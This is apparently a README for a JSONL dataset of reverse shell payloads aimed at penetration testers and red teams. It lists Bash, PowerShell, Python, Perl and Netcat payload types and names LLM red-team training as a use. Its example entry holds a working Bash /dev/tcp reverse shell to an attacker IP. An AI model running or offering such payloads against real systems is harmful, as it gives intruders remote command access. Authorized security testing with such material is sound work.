
# 🐚 Reverse Shell Payloads Dataset

A curated and structured dataset of **reverse shell payloads** used by penetration testers, red teams, and ethical hackers to establish remote command-line access during security assessments.

This dataset provides a diverse set of payloads across multiple platforms and scripting languages, including Bash, PowerShell, Python, Perl, and Netcat.

---

## 📁 Dataset Format

The dataset is provided in `.jsonl` (JSON Lines) format — each line represents a single reverse shell payload with its associated metadata.

### Example Entry:

```json
{
  "id": "rshell-001",
  "language": "bash",
  "payload": "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1",
  "description": "Basic Bash TCP reverse shell connecting to attacker host.",
  "platform": "Linux",
  "requires_netcat": false,
  "obfuscated": false,
  "tag": ["tcp", "bash"]
}
🔍 Fields Description
Field	Description
id	      Unique identifier for the payload
language	    Language used (e.g., Bash, Python, PowerShell)
payload	      Full reverse shell command
description	    Explanation of how the payload works
platform	    Target OS (e.g., Linux, Windows)
requires_netcat	     Whether the payload depends on netcat (nc)
obfuscated	     Whether the payload is encoded or obfuscated
tag
List of tags    (e.g., tcp, bash, obfuscated)

🧪 Payload Types Included

    🐧 Bash TCP & UDP shells

    🪟 PowerShell with/without obfuscation

    🐍 Python one-liners

    🦀 Perl reverse shells

    🛠️ Netcat variations (-e, named pipes, backconnects)

    🧬 Base64-encoded / eval / hidden commands

✅ Use Cases

    Red team cheat sheets and playbooks

    CTFs and pentesting simulations

    LLM red team assistant training (e.g., “Suggest a reverse shell”)

    Automated payload generators

    Adversary emulation platforms

⚠️ Disclaimer

This dataset is for educational and authorized penetration testing purposes only. Do not use these payloads on systems you do not own or have permission to test.
📜 License

Released under the MIT License.
🤝 Contributions

Want to add more reverse shells? PRs welcome for:

    Different scripting languages

    Obfuscation styles

    Encoded or encrypted payloads

    Staged connection shells
